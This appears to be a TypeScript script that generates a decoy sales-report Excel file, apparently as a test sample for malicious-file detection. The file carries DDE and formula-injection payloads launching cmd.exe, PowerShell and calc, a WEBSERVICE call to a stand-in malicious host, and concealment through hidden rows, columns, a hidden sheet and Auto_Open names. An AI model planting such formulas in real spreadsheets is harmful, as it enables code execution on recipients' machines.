import * as XLSX from 'xlsx'
import * as fs from 'fs'

// 새 워크북 생성
const workbook = XLSX.utils.book_new()

// 메인 시트 데이터
const mainData = [
  ['회사명', '분기', '매출', '이익'],
  ['ABC Corp', '2024 Q1', 1000000, 250000],
  ['ABC Corp', '2024 Q2', 1200000, 300000],
  ['ABC Corp', '2024 Q3', 1100000, 280000]
]

// 메인 시트 생성
const mainSheet = XLSX.utils.aoa_to_sheet(mainData)

// DDE 공격 패턴 수식 추가 - 직접 수식 설정
mainSheet['A10'] = { 
  t: 's',
  v: '중요 문서 다운로드',
  f: 'HYPERLINK("file:///c:/windows/system32/cmd.exe", "중요 문서 다운로드")'
}

mainSheet['B10'] = {
  t: 'e',
  v: '#REF!',
  f: '[외부파일.xlsx]Sheet1!A1'
}

mainSheet['C10'] = {
  t: 'e', 
  v: '#VALUE!',
  f: 'WEBSERVICE("http://malicious-site.com/data")'
}

mainSheet['Z100'] = { 
  t: 'n',
  v: 0,
  f: 'cmd|"/c calc.exe"!A1'  // = 없이 시작
}

// 숨겨진 행/열 설정
mainSheet['!rows'] = []
mainSheet['!rows'][9] = { hidden: true } // 10번째 행 숨기기 (0-based index)

mainSheet['!cols'] = []
mainSheet['!cols'][25] = { hidden: true } // Z열 숨기기

XLSX.utils.book_append_sheet(workbook, mainSheet, '매출보고서')

// 숨겨진 시트 생성
const hiddenSheet = XLSX.utils.aoa_to_sheet([
  ['숨겨진 데이터'],
  [''], // 빈 행
  ['사용자 비밀번호:', 'password123'],
  ['신용카드:', '1234-5678-9012-3456']
])

// DDE 공격 수식 추가
hiddenSheet['A2'] = {
  t: 'e',
  v: '#VALUE!',
  f: 'DDE("cmd","/c powershell.exe","")'
}

hiddenSheet['B2'] = {
  t: 'e',
  v: '#VALUE!', 
  f: 'cmd|" /C calc"!A0'
}

hiddenSheet['E1'] = {
  t: 'n',
  v: 0,
  f: 'DDEAUTO("c:\\windows\\system32\\cmd.exe", "/c calc.exe")'
}

XLSX.utils.book_append_sheet(workbook, hiddenSheet, 'Hidden_Data')

// 워크북 속성 설정
if (!workbook.Workbook) workbook.Workbook = {}
if (!workbook.Workbook.Sheets) workbook.Workbook.Sheets = []

// Hidden_Data 시트를 숨김 처리 (두 번째 시트이므로 index 1)
workbook.Workbook.Sheets[1] = { Hidden: 1 }

// 정의된 이름 추가
if (!workbook.Workbook.Names) workbook.Workbook.Names = []
workbook.Workbook.Names.push({
  Name: 'Auto_Open',
  Ref: 'Macros!$A$1'
})
workbook.Workbook.Names.push({
  Name: 'AutoExec', 
  Ref: 'Hidden_Data!$A$1'
})

// 파일 저장
const outputPath = './public/malicious-test-server.xlsx'
XLSX.writeFile(workbook, outputPath)

console.log('서버에서 악성코드 의심 테스트 파일 생성 완료!')
console.log('파일 위치:', outputPath)
